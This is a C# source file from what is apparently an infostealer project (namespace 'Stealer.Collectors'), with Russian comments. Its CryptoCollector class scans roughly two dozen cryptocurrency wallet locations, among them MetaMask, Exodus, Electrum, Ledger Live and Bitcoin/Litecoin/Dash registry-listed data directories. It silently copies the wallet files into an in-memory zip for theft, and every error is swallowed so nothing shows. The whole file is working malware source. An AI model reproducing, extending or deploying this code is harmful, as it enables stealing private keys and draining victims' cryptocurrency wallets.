using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Microsoft.Win32;
using Stealer.Utils;

namespace Stealer.Collectors
{
    public class CryptoCollector
    {
        private static readonly List<string[]> WalletDirectories = new List<string[]>
        {
            new[] { "Zcash", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zcash") },
            new[] { "Armory", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Armory") },
            new[] { "Bytecoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "bytecoin") },
            new[] { "Jaxx", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb") },
            new[] { "Exodus", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus", "exodus.wallet") },
            new[] { "Ethereum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ethereum", "keystore") },
            new[] { "Electrum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum", "wallets") },
            new[] { "AtomicWallet", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "atomic", "Local Storage", "leveldb") },
            new[] { "Atomic", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Atomic", "Local Storage", "leveldb") },
            new[] { "Guarda", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Guarda", "Local Storage", "leveldb") },
            new[] { "Coinomi", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Coinomi", "Coinomi", "wallets") },
            new[] { "Tari", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.tari.universe", "app_configs", "mainnet") },
            new[] { "Bitcoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitcoin", "wallets") },
            new[] { "Bitcoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin", "wallets") },
            new[] { "Dash", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DashCore", "wallets") },
            new[] { "Litecoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Litecoin", "wallets") },
            new[] { "MyMonero", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyMonero") },
            new[] { "Monero", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Monero") },
            new[] { "Binance", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Binance") },
            new[] { "Phantom", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Phantom", "IndexedDB", "file__0.indexeddb.leveldb") },
            new[] { "Coin98", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Coin98", "IndexedDB", "file__0.indexeddb.leveldb") },
            new[] { "MathWallet", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MathWallet", "IndexedDB", "file__0.indexeddb.leveldb") },
            new[] { "LedgerLive", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ledger Live") },
            new[] { "TrezorSuite", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrezorSuite") },
            new[] { "MetaMask", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MetaMask", "IndexedDB", "file__0.indexeddb.leveldb") },
            new[] { "TrustWallet", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "TrustWallet", "IndexedDB", "file__0.indexeddb.leveldb") }
        };

        private static readonly string[] WalletRegistry = new[] { "Litecoin", "Dash", "Bitcoin" };

        public static void Collect(InMemoryZip zip)
        {
            try
            {
                int collected = 0;

                // Собираем из директорий
                foreach (var wallet in WalletDirectories)
                {
                    try
                    {
                        string walletName = wallet[0];
                        string walletPath = wallet[1];

                        if (Directory.Exists(walletPath))
                        {
                            CopyWalletDirectory(zip, walletPath, walletName);
                            collected++;
                        }
                    }
                    catch { }
                }

                // Собираем из реестра
                foreach (var walletName in WalletRegistry)
                {
                    try
                    {
                        CopyWalletFromRegistry(zip, walletName);
                    }
                    catch { }
                }

            }
            catch
            {
            }
        }

        private static void CopyWalletDirectory(InMemoryZip zip, string sourcePath, string walletName)
        {
            try
            {
                foreach (var file in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                {
                    try
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        
                        // Ограничение размера файла (5MB)
                        if (fileInfo.Length > 5 * 1024 * 1024)
                            continue;

                        string relativePath = file.Substring(sourcePath.Length).TrimStart('\\', '/');
                        string targetPath = $"Wallets/{walletName}/{relativePath}";
                        
                        byte[] fileData = File.ReadAllBytes(file);
                        zip.AddFile(targetPath, fileData);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void CopyWalletFromRegistry(InMemoryZip zip, string walletName)
        {
            try
            {
                string keyPath = $"Software\\{walletName}\\{walletName}-Qt";
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath))
                {
                    if (key == null)
                        return;

                    string dataDir = key.GetValue("strDataDir")?.ToString();
                    if (string.IsNullOrEmpty(dataDir))
                        return;

                    string walletsPath = Path.Combine(dataDir, "wallets");
                    if (Directory.Exists(walletsPath))
                    {
                        CopyWalletDirectory(zip, walletsPath, walletName);
                    }
                }
            }
            catch { }
        }
    }
}
